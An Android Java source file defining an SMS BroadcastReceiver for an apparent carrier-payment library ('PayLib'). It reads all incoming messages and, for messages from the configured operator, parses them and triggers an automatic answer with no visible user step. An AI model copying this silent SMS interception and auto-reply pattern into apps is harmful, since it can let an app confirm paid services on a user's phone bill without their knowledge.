package  com.example.p2plib2.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.example.p2plib2.Logger;
import com.example.p2plib2.PayLib;

import static com.example.p2plib2.PayLib.operator;

public class SmsMonitor extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Logger.lg("New sms! " + intent.getAction() + " null " + (intent!=null));
        if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            String smsSender = "";
            String smsBody = "";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                    smsSender = smsMessage.getDisplayOriginatingAddress();
                    smsBody += smsMessage.getMessageBody();
                }
            } else {
                Bundle smsBundle = intent.getExtras();
                if (smsBundle != null) {
                    Object[] pdus = (Object[]) smsBundle.get("pdus");
                    if (pdus == null) {
                        // Display some error to the user
                        Logger.lg("SmsBundle had no pdus key");
                        return;
                    }
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < messages.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        smsBody += messages[i].getMessageBody();
                    }
                    smsSender = messages[0].getOriginatingAddress();
                }
            }
            Logger.lg("sender " + smsSender);
            if (smsSender.equals(operator.smsNum) || smsSender.toUpperCase().equals(operator.name)) {
                PayLib.getSMSResult(smsBody);
                PayLib.sendAnswer(smsBody);
            }
        }
    }
}
